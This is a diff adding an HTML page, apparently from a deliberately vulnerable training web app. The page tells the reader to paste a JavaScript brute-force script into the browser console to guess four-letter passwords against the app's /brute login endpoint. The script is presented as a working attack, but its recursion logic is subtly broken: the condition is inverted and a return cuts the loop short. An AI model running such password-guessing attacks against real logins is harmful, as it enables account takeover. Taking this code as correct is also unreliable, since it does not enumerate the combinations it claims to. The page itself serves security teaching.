@@ -1,0 +1,56 @@
+<h1>Brute Force Attack</h1>
+
+<pre>
+  Example attack
+  1. Open Inspect -> Console in your browser
+  2. Enter: 
+  <code>
+    const alphabet = Array.from({ length: 26 }, (_, i) => String.fromCharCode(i + 97))
+    let found = false
+
+    const checkResponse = (req) => {
+        if (req.status == 200) {
+            document.getElementById("status").innerHTML = "Status: Logged in"
+            found = true
+        }
+    }
+
+    const sendRequest = async (prefix) => {
+        let req = await fetch('/brute', {
+            method: 'POST',
+            body: JSON.stringify({ username: "user", password: prefix }),
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            }
+        })
+        checkResponse(req)
+    }
+
+    const generateCombinations = async (letters, length) => {
+        const generateCombinationRecursion = async (prefix, remainingLength) => {
+            remainingLength ? await sendRequest(prefix) : (async () => {
+                for (let i = 0; i < letters.length; i++) {
+                    return found ? [] : await generateCombinationRecursion(prefix + letters[i], remainingLength - 1)
+                }
+            })()
+        }
+        await generateCombinationRecursion('', length)
+    }
+    await generateCombinations(alphabet, 4)
+</code>
+  3. Click enter
+</pre>
+
+<form action="/brute" method="POST" id="loginF">
+    <h5>Login:</h5>
+    <label for="username">Username:</label>
+    <input id="username" type="text" name="username" placeholder="username" />
+    <br>
+    <label for="password">Password:</label>
+    <input id="password" type="password" name="password" placeholder="password" />
+    <br>
+    <input type="submit" value="Log in" style="margin-top: 10px">
+</form>
+
+<p id="status">Status: Logged out</p>
